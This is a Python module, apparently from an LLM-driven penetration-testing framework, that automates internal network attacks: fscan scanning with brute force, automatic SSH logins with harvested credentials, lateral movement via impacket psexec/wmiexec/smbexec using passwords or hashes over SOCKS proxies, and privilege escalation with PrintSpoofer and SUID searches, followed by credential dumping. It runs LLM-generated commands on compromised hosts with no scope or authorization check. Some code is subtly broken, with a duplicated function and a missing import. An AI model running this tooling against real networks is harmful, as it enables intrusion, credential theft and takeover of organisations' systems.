# internal_network/nodes.py
"""
内网渗透节点实现

节点:
- internal_recon_node: 内网侦察节点 (支持代理)
- lateral_move_node: 横向移动节点
- privilege_escalation_node: 权限提升节点 (新增)

设计原则:
- 独立于Web CTF架构
- 复用现有工具系统
- 不修改核心状态结构
- AI驱动决策贯穿全程
"""
import json
import time
import os
import ipaddress
from typing import Dict, List, Any, Optional
from llm_client import llm_client
from config import config
from tool_framework import ToolRegistry
from logger import get_logger

# 模块日志器
logger = get_logger("InternalNetwork")

# 导入远程执行模块
try:
    from remote_executor.executors import ProxyExecutor, execute_on_session
    from remote_executor.session_manager import get_session_manager
    REMOTE_EXEC_AVAILABLE = True
except ImportError:
    logger.warning("remote_executor module not available")
    REMOTE_EXEC_AVAILABLE = False

# 导入高级操作模块
try:
    from internal_network.advanced_operations import (
        PrivilegeEscalation,
        RemoteDesktopHandler,
        FileTransferHandler,
        CredentialDumper,
        IntelligentPathSelector,
        PersistenceHandler,
        OperationStatus
    )
    ADVANCED_OPS_AVAILABLE = True
except ImportError:
    logger.warning("Advanced operations module not available")
    ADVANCED_OPS_AVAILABLE = False


def internal_recon_node(state: Dict) -> Dict:
    """
    [内网侦察节点] AI驱动 + SOCKS5代理支持

    输入:
        - internal_network_range: 内网网段
        - pivot_host: 跳板机
        - proxy_info: 代理信息 (SOCKS5)

    输出:
        - internal_hosts: 发现的主机列表
        - update CTFState

    工作流程:
        1. AI决策扫描策略
        2. 配置SOCKS5代理 (如果可用)
        3. 使用fscan扫描目标
        4. 解析结果并AI分析
    """
    network_range = state.get("internal_network_range", "")
    pivot_host = state.get("pivot_host", "")
    current_url = state.get("current_url", "")
    proxy_info = state.get("proxy_info", {})
    shell_session = state.get("shell_session", {})

    # 从当前URL提取目标IP
    target_ip = ""
    if not network_range:
        import re
        if current_url:
            ip_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', current_url)
            if ip_match:
                target_ip = ip_match.group(1)
                network_range = target_ip

    if not network_range:
        return {
            "error": "无法确定扫描目标",
            "internal_mode": False,
            "failure_weighted_score": state.get("failure_weighted_score", 0) + 1.0
        }

    # AI决策扫描策略
    scan_strategy = _ai_decide_scan_strategy(state, network_range)
    print(f"[InternalRecon] AI决策: {scan_strategy.get('strategy', 'quick')}")

    # 检查是否需要通过SOCKS5代理扫描
    use_proxy = False
    proxy_executor = None

    if proxy_info and proxy_info.get("socks5_address"):
        socks_addr = proxy_info.get("socks5_address", "")
        socks_port = proxy_info.get("socks5_port", 10800)

        if socks_addr:
            print(f"[InternalRecon] 通过SOCKS5代理扫描: {socks_addr}:{socks_port}")
            use_proxy = True

            if REMOTE_EXEC_AVAILABLE:
                proxy_executor = ProxyExecutor(
                    proxy_host=socks_addr,
                    proxy_port=socks_port,
                    proxy_type="socks5"
                )

    # 执行扫描
    try:
        # 方式1: 通过跳板机上的工具扫描 (推荐)
        session_id = shell_session.get("session_id", "")
        if session_id and REMOTE_EXEC_AVAILABLE:
            print(f"[InternalRecon] 通过跳板机扫描...")
            result = _scan_via_pivot(state, network_range, scan_strategy)

        # 方式2: 通过本地SOCKS5代理扫描
        elif use_proxy and proxy_executor:
            print(f"[InternalRecon] 通过本地代理扫描...")
            result = _scan_via_proxy(proxy_executor, network_range, scan_strategy)

        # 方式3: 直接本地扫描 (外网可达)
        else:
            print(f"[InternalRecon] 本地直接扫描: {network_range}")
            result = _scan_local(network_range, scan_strategy)

        # 处理扫描结果
        if result.get("success"):
            hosts = result.get("hosts", [])

            if hosts:
                print(f"[InternalRecon] 发现 {len(hosts)} 台主机")

                # AI分析发现
                analysis = _analyze_internal_hosts(hosts, state)

                # AI选择下一个目标
                first_target = _ai_select_next_target(hosts, state)

                # AI决策：是否用发现的凭据建立SSH连接
                ssh_updates = _ai_try_connect_with_credentials(state)

                return {
                    "internal_hosts": hosts,
                    "internal_mode": True,
                    "current_internal_target": first_target,
                    "analyst_intel": analysis,
                    "scan_strategy": scan_strategy,
                    "execution_steps": state.get("execution_steps", 0) + 1,
                    **ssh_updates  # 合并SSH连接结果
                }

        # 无结果
        return {
            "error": result.get("error", "未发现存活主机或端口"),
            "internal_mode": False,
            "failure_weighted_score": state.get("failure_weighted_score", 0) + 0.5
        }

    except Exception as e:
        print(f"[InternalRecon] 扫描异常: {e}")
        return {
            "error": f"扫描异常: {str(e)}",
            "internal_mode": False,
            "failure_weighted_score": state.get("failure_weighted_score", 0) + 1.0
        }


def _ai_decide_scan_strategy(state: Dict, network_range: str) -> Dict:
    """
    AI决策扫描策略

    根据目标环境、时间限制、资源情况决定最优扫描方式
    """
    internal_hosts = state.get("internal_hosts") or []
    credentials = state.get("credentials") or []
    execution_steps = state.get("execution_steps", 0)

    prompt = f"""
分析内网环境，决策最优扫描策略。

## 环境
- 目标网段: {network_range}
- 已发现主机: {len(internal_hosts)} 台
- 已获取凭据: {len(credentials)} 组
- 执行步数: {execution_steps}

## 扫描选项
- quick: 快速扫描 (常用端口，速度快)
- full: 全端口扫描 (慢但全面)
- vuln: 漏洞扫描 (带漏洞探测)
- brute: 暴力破解 (尝试常见弱口令)

## 要求
1. 选择最合适的扫描策略
2. 给出扫描参数建议
3. 考虑时间和隐蔽性

## 输出格式 (JSON)
{{
    "strategy": "quick/full/vuln/brute",
    "ports": "端口列表或范围",
    "timeout": 超时建议,
    "reasoning": "选择理由"
}}
"""

    try:
        response = llm_client.call_chat_completion(
            model=config.ANALYST_MODEL,
            messages=[{"role": "user", "content": prompt}],
            temperature=0.1,
            json_mode=True
        )

        if "```json" in response:
            response = response.split("```json")[1].split("```")[0]

        strategy = json.loads(response.strip())
        return strategy

    except Exception as e:
        print(f"[InternalRecon] AI决策失败: {e}")
        return {"strategy": "quick", "ports": "1-1000", "timeout": 300}


def _scan_via_pivot(state: Dict, network_range: str, strategy: Dict) -> Dict:
    """
    通过跳板机扫描内网

    在跳板机上执行fscan等工具
    """
    shell_session = state.get("shell_session", {})
    session_id = shell_session.get("session_id", "")
    os_type = shell_session.get("os_type", "linux")

    if not session_id or not REMOTE_EXEC_AVAILABLE:
        return {"success": False, "error": "无可用的跳板机会话"}

    session_manager = get_session_manager()
    session = session_manager.get_session(session_id)

    if not session:
        return {"success": False, "error": "会话不存在"}

    # 确定工具路径
    if os_type == "windows":
        tool_path = "C:\\temp\\fscan.exe"
    else:
        tool_path = "/tmp/fscan"

    # 构建扫描命令
    ports = strategy.get("ports", "1-1000")
    scan_type = strategy.get("strategy", "quick")

    # AI生成扫描命令
    prompt = f"""
生成fscan扫描命令。

## 参数
- 工具路径: {tool_path}
- 目标网段: {network_range}
- 端口: {ports}
- 扫描类型: {scan_type}
- 操作系统: {os_type}

## 要求
输出完整的扫描命令，只输出命令，不要解释。
"""

    try:
        cmd = llm_client.call_chat_completion(
            model=config.ANALYST_MODEL,
            messages=[{"role": "user", "content": prompt}],
            temperature=0.1
        ).strip()

        print(f"[InternalRecon] 执行: {cmd}")

        result = execute_on_session(session, cmd, timeout=strategy.get("timeout", 300))

        if result.success:
            # 解析fscan输出
            hosts = _parse_fscan_output(result.output)
            return {"success": True, "hosts": hosts}
        else:
            return {"success": False, "error": result.error}

    except Exception as e:
        return {"success": False, "error": str(e)}


def _scan_via_proxy(proxy_executor, network_range: str, strategy: Dict) -> Dict:
    """
    通过SOCKS5代理扫描

    使用proxychains执行本地fscan
    """
    # fscan命令
    ports = strategy.get("ports", "1-1000")
    cmd = f"fscan -h {network_range} -p {ports} -o /tmp/fscan_result.txt"

    try:
        result = proxy_executor.execute_via_proxychains(cmd, timeout=strategy.get("timeout", 300))

        if result.success:
            hosts = _parse_fscan_output(result.output)
            return {"success": True, "hosts": hosts}
        else:
            return {"success": False, "error": result.error}

    except Exception as e:
        return {"success": False, "error": str(e)}


def _scan_local(network_range: str, strategy: Dict) -> Dict:
    """
    本地直接扫描 (外网可达场景)
    """
    ports = strategy.get("ports", "1-1000")

    try:
        fscan_result = ToolRegistry.execute_cached(
            "fscan",
            network_range,
            {
                "scan_type": strategy.get("strategy", "quick"),
                "brute": strategy.get("strategy") == "brute",
                "no_ping": True
            }
        )

        if not fscan_result:
            return {"success": False, "error": "扫描返回空结果"}

        # execute_cached 总是返回 {"cached": ..., "result": ...} 格式
        result = fscan_result.get("result", {})

        if result.get("success"):
            hosts_data = result.get("hosts", [])

            hosts = []
            for host_data in hosts_data:
                if not isinstance(host_data, dict):
                    continue

                host_info = {
                    "ip": host_data.get("ip", ""),
                    "hostname": "",
                    "os": "",
                    "ports": []
                }

                for port in host_data.get("ports", []):
                    if port.get("state") == "open" or port.get("port"):
                        host_info["ports"].append({
                            "port": port.get("port"),
                            "protocol": "tcp",
                            "service": port.get("service", ""),
                            "version": ""
                        })

                if host_info["ports"] and host_info["ip"]:
                    hosts.append(host_info)

            return {"success": True, "hosts": hosts}

        return {"success": False, "error": result.get("error", "扫描无结果")}

    except Exception as e:
        return {"success": False, "error": str(e)}


def _parse_fscan_output(output: str) -> List[Dict]:
    """
    AI解析fscan输出

    让AI分析输出，提取:
    1. 开放端口
    2. 暴力破解成功的凭据
    """
    if not output or len(output) < 10:
        return []

    prompt = f"""分析fscan扫描输出，提取关键信息。

## 输出内容
{output}

## 要求
提取以下信息:
1. 发现的开放端口 (IP:端口)
2. 暴力破解成功的凭据 (如果有)

## 输出格式 (JSON)
{{
    "hosts": [
        {{"ip": "IP地址", "ports": [端口号列表]}}
    ],
    "credentials": [
        {{"service": "ssh/smb/mysql等", "ip": "IP", "port": 端口, "username": "用户名", "password": "密码"}}
    ]
}}

只输出JSON，不要解释。"""

    try:
        response = llm_client.call_chat_completion(
            model=config.ANALYST_MODEL,
            messages=[{"role": "user", "content": prompt}],
            temperature=0.1,
            json_mode=True
        )

        result = json.loads(response.strip())

        # 存储凭据供后续使用
        global _discovered_credentials
        _discovered_credentials = result.get("credentials", [])

        # 转换为主机格式
        hosts = []
        for h in result.get("hosts", []):
            ip = h.get("ip", "")
            if not ip:
                continue
            try:
                ipaddress.ip_address(ip)  # 验证IP
                hosts.append({
                    "ip": ip,
                    "hostname": "",
                    "os": "",
                    "ports": [{"port": p, "protocol": "tcp", "service": "", "version": ""} for p in h.get("ports", [])]
                })
            except ValueError:
                continue

        return hosts

    except Exception as e:
        logger.warning(f"AI解析fscan输出失败: {e}")
        # 降级：简单正则提取IP:端口
        hosts = {}
        for line in output.split('\n'):
            match = re.search(r'(\d+\.\d+\.\d+\.\d+):(\d+)', line)
            if match:
                ip, port = match.group(1), int(match.group(2))
                if ip not in hosts:
                    hosts[ip] = {"ip": ip, "hostname": "", "os": "", "ports": []}
                hosts[ip]["ports"].append({"port": port, "protocol": "tcp", "service": "", "version": ""})
        return list(hosts.values())


# 存储AI提取的凭据
_discovered_credentials = []


def _ai_try_connect_with_credentials(state: Dict) -> Dict:
    """
    AI决策是否用发现的凭据建立连接
    """
    credentials = _discovered_credentials
    if not credentials:
        return {}

    prompt = f"""分析发现的凭据，决定连接策略。

## 凭据列表
{json.dumps(credentials, ensure_ascii=False, indent=2)}

## 已有会话
{json.dumps([s.get("host") for s in state.get("active_sessions", [])], ensure_ascii=False)}

## 要求
1. 选择最有价值的凭据尝试连接
2. 优先SSH (可交互)
3. 避免重复连接

## 输出格式 (JSON)
{{
    "should_connect": true/false,
    "reason": "理由",
    "selected": {{"service": "", "ip": "", "port": 22, "username": "", "password": ""}}
}}"""

    try:
        response = llm_client.call_chat_completion(
            model=config.ANALYST_MODEL,
            messages=[{"role": "user", "content": prompt}],
            temperature=0.1,
            json_mode=True
        )
        decision = json.loads(response.strip())

        if not decision.get("should_connect"):
            return {}

        selected = decision.get("selected", {})
        if selected.get("service") != "ssh":
            return {}

        # 尝试SSH连接
        ip = selected.get("ip")
        port = selected.get("port", 22)
        username = selected.get("username")
        password = selected.get("password")

        if not all([ip, username, password]):
            return {}

        logger.info(f"[AI决策] 尝试SSH连接: {username}@{ip}:{port}")

        from remote_executor.session_manager import get_session_manager
        sm = get_session_manager()
        session = sm.create_ssh_session(host=ip, username=username, password=password, port=port)

        if session:
            logger.info(f"[SSH] ✅ 连接成功: {username}@{ip}:{port}")
            return {
                "credentials": state.get("credentials", []) + [{
                    "username": username, "password": password, "host": ip, "port": port, "service": "ssh"
                }],
                "active_sessions": state.get("active_sessions", []) + [session.to_dict()],
                "shell_session": session.to_dict() if not state.get("shell_session") else state.get("shell_session")
            }

    except Exception as e:
        logger.warning(f"AI连接决策失败: {e}")

    return {}


def _ai_select_next_target(hosts: List[Dict], state: Dict) -> str:
    """
    AI选择下一个攻击目标

    综合考虑:
    - 高价值目标 (域控、数据库)
    - 已攻陷主机
    - 攻击成本
    """
    active_sessions = state.get("active_sessions") or []
    compromised = [s.get("host") for s in active_sessions if s.get("host")]

    prompt = f"""
选择下一个攻击目标。

## 已发现主机
{json.dumps(hosts[:15], ensure_ascii=False, indent=2)}

## 已攻陷主机
{compromised}

## 要求
1. 选择高价值目标
2. 避免已攻陷的主机
3. 考虑攻击可行性

## 输出格式 (JSON)
{{
    "target": "目标IP",
    "reason": "选择理由",
    "attack_method": "推荐攻击方法"
}}
"""

    try:
        response = llm_client.call_chat_completion(
            model=config.ANALYST_MODEL,
            messages=[{"role": "user", "content": prompt}],
            temperature=0.1,
            json_mode=True
        )

        if "```json" in response:
            response = response.split("```json")[1].split("```")[0]

        result = json.loads(response.strip())
        print(f"[InternalRecon] AI选择目标: {result.get('target')} - {result.get('reason')}")
        return result.get("target", "")

    except Exception:
        # 降级: 选择高价值目标
        return _select_high_value_target(hosts)


def _select_high_value_target(hosts: List[Dict]) -> str:
    """
    选择高价值目标 (降级方案)
    """
    for host in hosts:
        ports = [p.get("port") for p in host.get("ports", []) if p.get("port")]
        # 域控制器
        if any(p in ports for p in [88, 389, 636, 3268]):
            return host.get("ip", "")
        # 数据库
        if any(p in ports for p in [1433, 3306, 5432]):
            return host.get("ip", "")
        # 文件服务器
        if 445 in ports:
            return host.get("ip", "")

    return hosts[0].get("ip", "") if hosts else ""


def _analyze_internal_hosts(hosts: List[Dict], state: Dict = None) -> str:
    """
    AI分析内网主机发现 - 压缩上下文避免爆炸
    """
    if not hosts:
        return "未发现内网主机"

    # 压缩主机信息为摘要格式
    summary_lines = []
    for host in hosts[:10]:  # 只分析前10个
        ports = host.get("ports") or []
        ports_str = ", ".join([f"{p.get('port', '?')}" for p in ports[:5] if isinstance(p, dict)])
        summary_lines.append(f"{host.get('ip', '?')}: [{ports_str}]")

    summary = "\n".join(summary_lines)

    # 统计信息 (压缩上下文)
    stats = {
        "total_hosts": len(hosts),
        "total_ports": sum(len(h.get("ports", [])) for h in hosts),
        "has_dc": any(any(p.get("port") in [88, 389, 636, 3268] for p in h.get("ports", [])) for h in hosts),
        "has_db": any(any(p.get("port") in [1433, 3306, 5432] for p in h.get("ports", [])) for h in hosts),
    }

    prompt = f"""
分析内网扫描结果，识别高价值目标。

## 统计
- 主机数: {stats['total_hosts']}
- 端口数: {stats['total_ports']}
- 发现域控: {stats['has_dc']}
- 发现数据库: {stats['has_db']}

## 主机摘要
{summary}

## 要求
输出一行分析结论，包括:
1. 高价值目标
2. 推荐攻击方法
"""

    try:
        analysis = llm_client.call_chat_completion(
            model=config.ANALYST_MODEL,
            messages=[{"role": "user", "content": prompt}],
            temperature=0.1
        ).strip()

        return analysis

    except Exception:
        return f"发现 {len(hosts)} 台主机，建议优先测试开放445/3389端口的主机"


def lateral_move_node(state: Dict) -> Dict:
    """
    [横向移动节点] AI驱动的横向移动

    输入:
        - current_internal_target: 当前目标
        - credentials: 已获取的凭据
        - internal_hosts: 已发现的主机
        - proxy_info: 代理信息

    输出:
        - active_sessions: 新会话
        - lateral_movement_paths: 移动路径

    AI决策:
        1. 选择最优目标
        2. 选择最佳攻击方法
        3. 选择合适的凭据
        4. 通过代理执行
    """
    # 安全获取列表，处理None值
    target = state.get("current_internal_target", "")
    credentials = state.get("credentials") or []
    internal_hosts = state.get("internal_hosts") or []
    active_sessions = state.get("active_sessions") or []
    proxy_info = state.get("proxy_info", {})
    shell_session = state.get("shell_session", {})

    if not target:
        # AI选择下一个目标
        target = _ai_select_next_target(internal_hosts, state)

    if not target:
        return {
            "error": "没有可用的横向移动目标",
            "internal_mode": False,
            "failure_weighted_score": state.get("failure_weighted_score", 0) + 0.5
        }

    if not credentials:
        return {
            "error": "没有可用凭据",
            "current_internal_target": target,
            "failure_weighted_score": state.get("failure_weighted_score", 0) + 1.0
        }

    # 获取目标主机信息
    target_host = next(
        (h for h in internal_hosts if isinstance(h, dict) and h.get("ip") == target),
        {}
    )
    ports = target_host.get("ports") or []

    # AI决策横向移动策略
    move_strategy = _ai_decide_lateral_strategy(target, target_host, credentials, state)

    print(f"[LateralMove] AI决策: {move_strategy.get('method')} -> {target}")

    # 执行横向移动
    result = None
    method = move_strategy.get("method", "psexec")
    cred = move_strategy.get("credential", credentials[0] if credentials else {})

    try:
        # 根据是否需要代理选择执行方式
        if proxy_info and REMOTE_EXEC_AVAILABLE:
            # 通过代理执行
            result = _execute_lateral_via_proxy(target, method, cred, proxy_info)
        elif shell_session.get("session_id") and REMOTE_EXEC_AVAILABLE:
            # 通过跳板机执行
            result = _execute_lateral_via_pivot(target, method, cred, shell_session)
        else:
            # 本地直接执行
            if method in ["psexec", "wmiexec", "smbexec"]:
                result = ToolRegistry.execute_cached(
                    "impacket",
                    target,
                    {
                        "script": method,
                        "target": target,
                        "username": cred.get("username", ""),
                        "password": cred.get("password", ""),
                        "domain": cred.get("domain", ""),
                        "hash": cred.get("hash", ""),
                        "command": "whoami"
                    }
                )
            elif method == "ssh":
                result = ToolRegistry.execute_cached(
                    "hydra",
                    target,
                    {
                        "target": target,
                        "protocol": "ssh",
                        "username": cred.get("username", ""),
                        "password": cred.get("password", "")
                    }
                )

        # 处理结果
        if result and result.get("result", {}).get("success"):
            session = {
                "host": target,
                "session_type": method,
                "username": cred.get("username", ""),
                "shell_type": "shell"
            }

            move_path = {
                "source": state.get("pivot_host", ""),
                "target": target,
                "method": method,
                "credential_used": f"{cred.get('username')}@{cred.get('domain', 'WORKGROUP')}"
            }

            print(f"[LateralMove] 成功获取 {target} 的shell")

            return {
                "active_sessions": [session],
                "lateral_movement_paths": [move_path],
                "pivot_host": target,
                "execution_steps": state.get("execution_steps", 0) + 1
            }

        error_msg = "横向移动失败"
        if result:
            if result.get("error"):
                error_msg = result["error"]
            elif result.get("result", {}).get("error"):
                error_msg = result["result"]["error"]

        print(f"[LateralMove] 失败: {error_msg}")

        return {
            "error": error_msg,
            "failure_weighted_score": state.get("failure_weighted_score", 0) + 1.0,
            "current_internal_target": target
        }

    except Exception as e:
        print(f"[LateralMove] 异常: {e}")
        return {
            "error": f"横向移动异常: {str(e)}",
            "failure_weighted_score": state.get("failure_weighted_score", 0) + 1.0
        }


def _ai_decide_lateral_strategy(
    target: str,
    target_host: Dict,
    credentials: List[Dict],
    state: Dict
) -> Dict:
    """
    AI决策横向移动策略

    分析:
    - 目标系统类型和开放端口
    - 可用凭据
    - 代理状态
    - 攻击成本
    """
    ports = target_host.get("ports") or []
    ports_str = ", ".join([str(p.get("port", "?")) for p in ports[:10]])

    # 压缩凭据信息
    creds_summary = []
    for c in credentials[:5]:
        domain = c.get("domain", "WORKGROUP")
        user = c.get("username", "?")
        has_pass = "yes" if c.get("password") else "no"
        has_hash = "yes" if c.get("hash") else "no"
        creds_summary.append(f"{user}@{domain} (pass:{has_pass}, hash:{has_hash})")

    prompt = f"""
分析目标，决策最佳横向移动策略。

## 目标信息
- IP: {target}
- 开放端口: {ports_str}

## 可用凭据
{chr(10).join(creds_summary) if creds_summary else '无'}

## 可用方法
- psexec: 需要SMB(445), 管理员权限
- wmiexec: 需要WMI(135), 管理员权限
- smbexec: 需要SMB(445), 较隐蔽
- ssh: 需要SSH(22), 普通用户即可
- evil-winrm: 需要WinRM(5985/5986), 管理员权限

## 输出格式 (JSON)
{{
    "method": "psexec/wmiexec/smbexec/ssh/evil-winrm",
    "credential_index": 0,
    "reason": "选择理由",
    "risk_level": "low/medium/high"
}}
"""

    try:
        response = llm_client.call_chat_completion(
            model=config.ANALYST_MODEL,
            messages=[{"role": "user", "content": prompt}],
            temperature=0.1,
            json_mode=True
        )

        if "```json" in response:
            response = response.split("```json")[1].split("```")[0]

        result = json.loads(response.strip())

        # 获取选择的凭据
        cred_idx = result.get("credential_index", 0)
        if 0 <= cred_idx < len(credentials):
            result["credential"] = credentials[cred_idx]
        else:
            result["credential"] = credentials[0] if credentials else {}

        return result

    except Exception as e:
        print(f"[LateralMove] AI决策失败: {e}")
        # 降级: 基于规则选择
        method = _select_lateral_method(ports)
        return {
            "method": method,
            "credential": credentials[0] if credentials else {},
            "reason": "降级规则选择"
        }


def _execute_lateral_via_proxy(target: str, method: str, cred: Dict, proxy_info: Dict) -> Dict:
    """通过代理执行横向移动"""
    if not REMOTE_EXEC_AVAILABLE:
        return {"error": "代理执行模块不可用"}

    socks_addr = proxy_info.get("socks5_address", "127.0.0.1")
    socks_port = proxy_info.get("socks5_port", 10800)

    proxy_exec = ProxyExecutor(
        proxy_host=socks_addr,
        proxy_port=socks_port,
        proxy_type="socks5"
    )

    # 构建impacket命令
    if method in ["psexec", "wmiexec", "smbexec"]:
        domain = cred.get("domain", "")
        username = cred.get("username", "")
        password = cred.get("password", "")
        hash_val = cred.get("hash", "")

        # 构建认证字符串
        if domain:
            auth = f"{domain}/{username}"
        else:
            auth = username

        if hash_val:
            cmd = f"impacket-{method} -hashes {hash_val} {auth}@{target}"
        else:
            cmd = f"impacket-{method} {auth}:{password}@{target}"

        result = proxy_exec.execute_via_proxychains(cmd, timeout=120)
        return {
            "result": {
                "success": result.success,
                "output": result.output,
                "error": result.error
            }
        }

    return {"error": f"不支持的代理方法: {method}"}


def _execute_lateral_via_pivot(target: str, method: str, cred: Dict, shell_session: Dict) -> Dict:
    """通过跳板机执行横向移动"""
    if not REMOTE_EXEC_AVAILABLE:
        return {"error": "远程执行模块不可用"}

    session_id = shell_session.get("session_id", "")
    if not session_id:
        return {"error": "无有效会话"}

    session_manager = get_session_manager()
    session = session_manager.get_session(session_id)

    if not session:
        return {"error": "会话不存在"}

    # AI生成横向移动命令
    prompt = f"""
生成横向移动命令。

## 目标
- IP: {target}
- 方法: {method}

## 凭据
- 用户: {cred.get('username', '')}
- 密码: {cred.get('password', '')}
- 哈希: {cred.get('hash', '')}
- 域: {cred.get('domain', '')}

## 要求
输出完整的命令，只输出命令。
"""

    try:
        cmd = llm_client.call_chat_completion(
            model=config.ANALYST_MODEL,
            messages=[{"role": "user", "content": prompt}],
            temperature=0.1
        ).strip()

        result = execute_on_session(session, cmd, timeout=120)

        return {
            "result": {
                "success": result.success,
                "output": result.output,
                "error": result.error
            }
        }
    except Exception as e:
        return {"error": str(e)}


def _select_best_credential(
    credentials: List[Dict],
    target: str,
    internal_hosts: List[Dict]
) -> Dict:
    """
    智能选择最适合目标主机的凭据

    优先级:
    1. 与目标同域的凭据
    2. 管理员凭据
    3. 第一个可用凭据
    """
    # 获取目标主机的域信息
    target_host = next(
        (h for h in internal_hosts if isinstance(h, dict) and h.get("ip") == target),
        {}
    )
    target_domain = target_host.get("domain", "")

    # 优先选择同域凭据
    if target_domain:
        for cred in credentials:
            if isinstance(cred, dict) and cred.get("domain") == target_domain:
                return cred

    # 其次选择管理员凭据
    for cred in credentials:
        if isinstance(cred, dict):
            username = cred.get("username", "").lower()
            if username in ["administrator", "admin", "root"]:
                return cred

    # 返回第一个可用凭据
    return credentials[0] if credentials else {}


def _analyze_internal_hosts(hosts: List[Dict]) -> str:
    """AI分析内网主机发现"""
    if not hosts:
        return "未发现内网主机"

    # 构建摘要
    summary_lines = []
    for host in hosts[:10]:
        ports = host.get("ports") or []
        ports_str = ", ".join([f"{p['port']}/{p.get('service', '?')}" for p in ports[:5] if isinstance(p, dict) and 'port' in p])
        summary_lines.append(f"{host.get('ip', 'unknown')}: [{ports_str}]")

    summary = "\n".join(summary_lines)

    prompt = f"""
分析内网扫描结果，识别高价值目标和潜在攻击路径。

## 发现的主机
{summary}

## 分析要求
1. 识别可能存在漏洞的服务
2. 推荐优先攻击的目标
3. 建议攻击方法

## 输出格式 (JSON)
{{
  "high_value_targets": ["IP列表"],
  "vulnerable_services": ["服务列表"],
  "recommended_approach": "一句话建议",
  "priority_order": ["IP顺序"]
}}
"""

    try:
        analysis = llm_client.call_chat_completion(
            model=config.ANALYST_MODEL,
            messages=[{"role": "user", "content": prompt}],
            temperature=0.1,
            json_mode=True
        )

        if "```json" in analysis:
            analysis = analysis.split("```json")[1].split("```")[0]

        result = json.loads(analysis.strip())
        return f"高价值目标: {', '.join(result.get('high_value_targets', []))}\n建议: {result.get('recommended_approach', '')}"

    except Exception:
        return f"发现 {len(hosts)} 台主机，建议优先测试开放445/3389端口的主机"


def _select_lateral_method(ports: List[Dict]) -> str:
    """根据端口选择横向移动方法"""
    port_numbers = [p.get("port") for p in ports]

    if 445 in port_numbers:  # SMB
        return "psexec"
    elif 135 in port_numbers or 5985 in port_numbers or 5986 in port_numbers:  # WinRM/WMI
        return "wmiexec"
    elif 22 in port_numbers:  # SSH
        return "ssh"
    elif 3389 in port_numbers:  # RDP
        return "rdp"
    else:
        return "psexec"  # 默认尝试psexec


def privilege_escalation_node(state: Dict) -> Dict:
    """
    [权限提升节点] AI驱动的权限提升

    输入:
        - active_sessions: 活跃会话
        - current_internal_target: 当前目标
        - shell_session: Shell会话信息

    输出:
        - active_sessions: 更新后的会话（包含提权状态）
        - credentials: 新获取的凭据

    AI决策:
        1. 分析系统信息选择提权方法
        2. 动态生成提权命令
        3. 处理提权失败的重试策略
    """
    active_sessions = state.get("active_sessions") or []
    credentials = state.get("credentials") or []
    shell_session = state.get("shell_session", {})

    if not active_sessions:
        return {
            "error": "没有活跃会话可用于提权",
            "internal_mode": False,
            "failure_weighted_score": state.get("failure_weighted_score", 0) + 1.0
        }

    # 选择第一个会话进行提权
    session = active_sessions[0]
    target = session.get("host", "")
    os_type = session.get("os_type", shell_session.get("os_type", "linux"))
    is_admin = session.get("is_admin", False)

    print(f"[PrivEsc] AI分析 {target} ({os_type}) 的提权路径...")

    # 如果已经有管理员权限，直接尝试凭据转储
    if is_admin:
        print(f"[PrivEsc] 已有管理员权限，尝试凭据转储")
        return _ai_credential_dump(state, session, active_sessions, credentials, shell_session)

    # AI决策提权策略
    priv_strategy = _ai_decide_privesc_strategy(target, os_type, session, state)

    print(f"[PrivEsc] AI决策: {priv_strategy.get('method')} - {priv_strategy.get('reason', '')}")

    # 执行提权
    if REMOTE_EXEC_AVAILABLE and shell_session.get("session_id"):
        result = _execute_privesc_via_session(shell_session, priv_strategy, os_type)
    else:
        # 使用高级操作模块
        if ADVANCED_OPS_AVAILABLE:
            result = _execute_privesc_advanced(session, priv_strategy)
        else:
            return {
                "error": "提权模块不可用",
                "failure_weighted_score": state.get("failure_weighted_score", 0) + 0.5
            }

    if result.get("success"):
        print(f"[PrivEsc] 提权成功！")
        session["is_admin"] = True
        session["is_system"] = result.get("is_system", False)

        # 尝试凭据转储
        return _ai_credential_dump(state, session, active_sessions, credentials, shell_session)
    else:
        print(f"[PrivEsc] 提权失败: {result.get('error', '')}")

        # AI决策下一步
        next_step = priv_strategy.get("on_failure", "retry")
        if next_step == "abandon":
            return {
                "error": result.get("error", "提权失败"),
                "failure_weighted_score": state.get("failure_weighted_score", 0) + 1.0,
                "active_sessions": active_sessions
            }
        else:
            return {
                "error": result.get("error", "提权失败"),
                "failure_weighted_score": state.get("failure_weighted_score", 0) + 0.5,
                "active_sessions": active_sessions
            }


def _ai_decide_privesc_strategy(target: str, os_type: str, session: Dict, state: Dict) -> Dict:
    """
    AI决策提权策略

    分析:
    - 系统版本
    - 已有权限
    - 可用工具
    - 历史尝试
    """
    is_admin = session.get("is_admin", False)

    # 提权方法选项
    if os_type == "windows":
        methods = [
            "PrintSpoofer: SeImpersonate权限，Win10/2016+",
            "SweetPotato: COM/DCOM滥用，更通用",
            "JuicyPotato: Win2012及更早",
            "RoguePotato: 需要出网",
            "Bypass-UAC: 绕过UAC",
            "Token-Impersonate: 令牌模拟"
        ]
    else:
        methods = [
            "SUID二进制: 查找SUID文件",
            "Sudo配置: sudo -l",
            "内核漏洞: 内核版本提权",
            "Cron任务: 计划任务",
            "Docker逃逸: 容器环境",
            "密码文件: 敏感文件搜索"
        ]

    prompt = f"""
分析目标系统，决策最佳提权策略。

## 目标信息
- IP: {target}
- 操作系统: {os_type}
- 当前权限: {'管理员' if is_admin else '普通用户'}

## 可用方法
{chr(10).join(methods)}

## 输出格式 (JSON)
{{
    "method": "方法名称",
    "commands": ["执行命令列表"],
    "reason": "选择理由",
    "on_failure": "retry/abandon"
}}
"""

    try:
        response = llm_client.call_chat_completion(
            model=config.ANALYST_MODEL,
            messages=[{"role": "user", "content": prompt}],
            temperature=0.1,
            json_mode=True
        )

        if "```json" in response:
            response = response.split("```json")[1].split("```")[0]

        return json.loads(response.strip())

    except Exception as e:
        print(f"[PrivEsc] AI决策失败: {e}")
        # 降级策略
        if os_type == "windows":
            return {
                "method": "PrintSpoofer",
                "commands": ["PrintSpoofer64.exe -i -c cmd"],
                "reason": "降级默认",
                "on_failure": "retry"
            }
        else:
            return {
                "method": "SUID二进制",
                "commands": ["find / -perm -4000 2>/dev/null"],
                "reason": "降级默认",
                "on_failure": "retry"
            }


def _execute_privesc_via_session(shell_session: Dict, strategy: Dict, os_type: str) -> Dict:
    """通过远程会话执行提权"""
    session_id = shell_session.get("session_id", "")
    if not session_id:
        return {"success": False, "error": "无有效会话"}

    session_manager = get_session_manager()
    session = session_manager.get_session(session_id)

    if not session:
        return {"success": False, "error": "会话不存在"}

    commands = strategy.get("commands", [])
    results = []

